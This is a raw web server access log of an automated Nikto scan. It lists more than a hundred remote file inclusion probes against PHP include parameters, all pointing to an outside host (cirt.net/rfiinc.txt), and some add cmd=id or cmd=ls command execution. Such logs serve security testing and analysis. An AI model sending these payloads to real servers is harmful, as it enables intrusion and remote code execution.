172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/ajax_listado.php?urlModulo=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004970)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/archive/archive_topic.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004971)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/archive/archive_topic.php?phpbb_root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004972)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/bbcb_mg.php?phpbb_root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004973)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/begin.inc.php?PagePrefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004974)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/blogger.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004975)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/class/class_tpl.php?cache_file=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004976)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/class_template.php?quezza_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004977)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/classes/pctemplate.php?pcConfig[smartyPath]=http://cirt.net/rfiinc.txt??cmd HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004978)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/common.inc.php?CONFIG[BASE_PATH]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004979)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/common.php?module_root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004980)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/common.php?root=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004981)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/common.php?root=http://cirt.net/rfiinc.txt??? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004982)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/common.php?root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004983)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/common.php?root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004984)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/config.inc.php?racineTBS=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004985)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/config/master.inc.php?fm_data[root]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004986)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/config/master.inc.php?fm_data[root]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004987)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/connection.inc.php?PagePrefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004988)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/dbal.php?eqdkp_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004989)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/events.inc.php?PagePrefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004990)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/footer.html.inc.php?tc_config[app_root]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004991)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/footer.inc.php?PagePrefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004992)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/footer.php?PHPGREETZ_INCLUDE_DIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004993)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/functions.inc.php?sitepath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004994)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/functions.php?location=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004995)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/functions.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004996)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/functions.php?phpbb_root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004997)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/functions/auto_email_notify.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004998)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/functions/html_generate.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004999)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/functions/master.inc.php?fm_data[root]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005000)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/functions/master.inc.php?fm_data[root]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005001)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/functions/validations.php?path_prefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005002)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/functions_admin.php?phpbb_root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005003)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/functions_install.php?vwar_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005004)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/functions_kb.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005005)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/functions_kb.php?phpbb_root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005006)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/functions_mod_user.php?phpbb_root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005007)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/functions_portal.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005008)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/functions_portal.php?phpbb_root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005009)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/functions_user_viewed_posts.php?phpbb_root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005010)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/global.php?nbs=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005011)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/header.inc.php?PagePrefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005012)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/header.inc.php?dateiPfad=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005013)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/include_once.php?include_file=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005014)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/init.php?includepath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 472 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005015)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/iplogger.php?phpbb_root_path=http://cirt.net/rfiinc.txt??ls HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005016)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/kb_constants.php?module_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005017)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/kb_constants.php?module_root_path=http://cirt.net/rfiinc.txt??cmd=ls HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005018)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/lang/language.php?path_to_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005019)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/lib-account.inc.php?CONF_CONFIG_PATH=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005020)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/lib-group.inc.php?CONF_CONFIG_PATH=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005021)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/lib-log.inc.php?CONF_CONFIG_PATH=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005022)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/lib-mydb.inc.php?CONF_CONFIG_PATH=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005023)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/lib-template-mod.inc.php?CONF_CONFIG_PATH=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005024)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/lib-themes.inc.php?CONF_CONFIG_PATH=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005025)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/logger_engine.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005026)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/menuleft.inc.php?PagePrefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005027)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/mkb.php?phpbb_root_path=http://cirt.net/rfiinc.txt??ls HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005028)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/morcegoCMS/adodb/adodb.inc.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005029)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/morcegoCMS/morcegoCMS.php?fichero=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005030)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/mx_common.php?module_root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005031)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/openid/Auth/OpenID/BBStore.php?openid_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005032)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/orderSuccess.inc.php?&glob=1&cart_order_id=1&glob[rootDir]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005033)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/pafiledb_constants.php?module_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005034)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/pages.inc.php?PagePrefix=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005035)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/phpdig/includes/config.php?relative_script_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005036)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/profilcp_constants.php?module_root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005037)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/settings.inc.php?approot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005038)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/template.php?myevent_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005039)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/themen_portal_mitte.php?phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005040)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/tumbnail.php?config[root_ordner]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005041)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/usercp_register.php?phpbb_root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005042)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/usercp_viewprofile.php?phpbb_root_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005043)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /includes/xhtml.php?d_root=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005044)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php3?Application_Root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005045)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?1=lol&PAGES[lol]=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005046)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?AML_opensite=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005047)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?AMV_openconfig=1&AMV_serverpath=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005048)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?CONFIG[MWCHAT_Libs]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005049)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?ConfigDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005050)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?DIR_PLUGINS=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005051)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?G_JGALL[inc_path]=http://cirt.net/rfiinc.txt?%00 HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005052)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?HomeDir=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005053)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?Lang=AR&Page=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005054)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?Madoa=http://cirt.net/rfiinc.txt?? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005055)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?RP_PATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005056)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?_REQUEST=&_REQUEST[option]=com_content&_REQUEST[Itemid=1&GLOBALS=&mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005057)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?_REQUEST=&_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005058)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?abg_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005059)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?abs_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005060)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?abs_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005061)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?adduser=true&lang=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005062)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?adodb=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005063)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?ads_file=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005064)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?arquivo=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005065)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?back=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005066)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?base==http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005067)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?basePath=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005068)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?bibtexrootrel=http://cirt.net/rfiinc.txt?? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005069)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?blog_dc_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005070)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?blog_theme=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005071)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?body=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005072)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?class_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005073)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?classified_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005074)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?cms=http://cirt.net/rfiinc.txt?? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005075)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?config[\\\"sipssys\\\"]=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005076)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?config[root_ordner]=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005077)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?config[root_ordner]=http://cirt.net/rfiinc.txt??cmd=id HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005078)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?config_atkroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005079)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?configuration=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005080)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?custom_admin_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005081)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?dateiPfad=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005082)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?de=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005083)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?dept=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005084)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?do=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005085)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?exec=http://cirt.net/rfiinc.txt?? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005086)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?ext=http://cirt.net/rfiinc.txt? HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005087)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /index.php?faq_path=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005088)"
